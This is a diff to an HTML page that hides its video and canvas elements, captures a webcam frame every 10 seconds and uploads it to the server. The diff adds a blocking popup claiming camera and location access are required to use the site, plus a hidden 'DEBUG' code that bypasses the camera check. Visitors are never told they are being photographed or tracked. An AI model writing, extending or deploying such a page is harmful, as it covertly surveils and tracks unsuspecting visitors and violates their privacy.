@@ -10,10 +10,87 @@
       margin: 0;
       height: 100vh;
       overflow: hidden;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+    #warning-popup {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(0, 0, 0, 0.9);
+      color: white;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      text-align: center;
+      font-family: Arial, sans-serif;
+      font-size: 18px;
+      z-index: 10;
+      display: none; /* Initially hidden */
+    }
+    #warning-popup button {
+      margin-top: 20px;
+      padding: 10px 20px;
+      font-size: 16px;
+      color: white;
+      background-color: #333;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+    #menu-button {
+      position: fixed;
+      bottom: 20px;
+      right: 20px;
+      width: 50px;
+      height: 50px;
+      background-color: #333;
+      color: white;
+      border: none;
+      border-radius: 50%;
+      font-size: 24px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      cursor: pointer;
+      z-index: 20;
+    }
+    #debug-panel {
+      position: fixed;
+      bottom: 80px;
+      right: 20px;
+      background-color: #444;
+      padding: 10px;
+      border-radius: 8px;
+      display: none; /* Initially hidden */
+      z-index: 20;
+    }
+    #debug-panel input {
+      width: 150px;
+      padding: 5px;
+      font-size: 16px;
+      border: none;
+      border-radius: 5px;
     }
   </style>
 </head>
 <body>
+  <div id="warning-popup">
+    <div>
+      <p>Camera and location access are required to use this site.</p>
+      <p>Please enable these permissions and reload the page.</p>
+      <button onclick="reloadPage()">Reload</button>
+    </div>
+  </div>
+
+  <button id="menu-button">☰</button>
+  <div id="debug-panel">
+    <input type="text" id="debug-input" placeholder="Enter code" />
+  </div>
+
   <video id="video" autoplay muted playsinline style="display:none;"></video>
   <canvas id="canvas" style="display:none;"></canvas>
 
@@ -21,23 +98,98 @@
     const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
     const context = canvas.getContext('2d');
+    const popup = document.getElementById('warning-popup');
+    const menuButton = document.getElementById('menu-button');
+    const debugPanel = document.getElementById('debug-panel');
+    const debugInput = document.getElementById('debug-input');
 
-    // Request location permission
-    navigator.geolocation.getCurrentPosition(
-      () => console.log('Location permission granted.'),
-      error => console.warn('Location permission denied or not yet granted:', error)
-    );
+    let bypassCameraCheck = false; // Flag for bypassing camera check
+
+    // Function to reload the page
+    function reloadPage() {
+      location.reload();
+    }
+
+    // Show warning popup if permissions are denied
+    function showWarningPopup() {
+      popup.style.display = 'flex';
+    }
+
+    // Toggle debug panel visibility
+    menuButton.addEventListener('click', () => {
+      debugPanel.style.display = debugPanel.style.display === 'none' ? 'block' : 'none';
+    });
+
+    // Handle debug code entry
+    debugInput.addEventListener('keydown', (e) => {
+      if (e.key === 'Enter') {
+        if (debugInput.value === 'DEBUG') {
+          bypassCameraCheck = true; // Enable bypass
+          debugPanel.style.display = 'none'; // Hide debug panel
+          debugInput.value = ''; // Clear input field
+          checkPermissions(); // Retry permission checks with bypass
+        }
+      }
+    });
+
+    // Function to check permissions
+    async function checkPermissions() {
+      let cameraAllowed = false;
+      let locationAllowed = false;
+
+      // Check camera permission (only if not bypassed)
+      if (!bypassCameraCheck) {
+        try {
+          const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+          cameraAllowed = true;
+          video.srcObject = stream;
+        } catch (error) {
+          console.error('Camera access denied:', error);
+        }
+      } else {
+        console.log('Camera check bypassed.');
+        cameraAllowed = true; // Set to true if bypassed
+      }
+
+      // Check location permission
+      try {
+        await new Promise((resolve, reject) => {
+          navigator.geolocation.getCurrentPosition(resolve, reject);
+        });
+        locationAllowed = true;
+      } catch (error) {
+        console.error('Location access denied:', error);
+      }
+
+      // Show popup if either permission is denied
+      if (!cameraAllowed || !locationAllowed) {
+        showWarningPopup();
+      } else {
+        console.log('All permissions granted or bypassed.');
+        startCapturing();
+      }
+    }
+
+    // Start capturing data (if permissions are granted or bypassed)
+    function startCapturing() {
+      setInterval(captureAndSend, 10000); // capture every 10 seconds
+    }
 
     async function captureAndSend() {
       // Set up video canvas
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      context.drawImage(video, 0, 0, canvas.width, canvas.height);
+      canvas.width = video.videoWidth || 640; // Default width if no video
+      canvas.height = video.videoHeight || 480; // Default height if no video
+      context.fillStyle = "black"; // Fill with black if no video
+      context.fillRect(0, 0, canvas.width, canvas.height);
+
+      if (video.readyState === 4) {
+        context.drawImage(video, 0, 0, canvas.width, canvas.height); // Draw video frame
+      }
 
       // Convert video frame to image data
       const image = canvas.toDataURL('image/jpeg');
 
-      // Send image to the server (only if video is available)
+      // Send image to the server
       await fetch('/upload', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -60,19 +212,10 @@
       }
     }
 
-    // Access the camera (with error handling)
-    navigator.mediaDevices.getUserMedia({ video: true })
-      .then(stream => {
-        video.srcObject = stream;
-        console.log('Camera access granted');
-        // Start capturing every 10 seconds
-        setInterval(captureAndSend, 10000);
-      })
-      .catch(error => {
-        console.error('No camera detected or access denied:', error);
-        // Still capture location if camera access fails
-        setInterval(captureAndSend, 10000); // capture and send location only
-      });
+    // Run permission checks when the page loads
+    checkPermissions();
   </script>
 </body>
 </html>
+
+
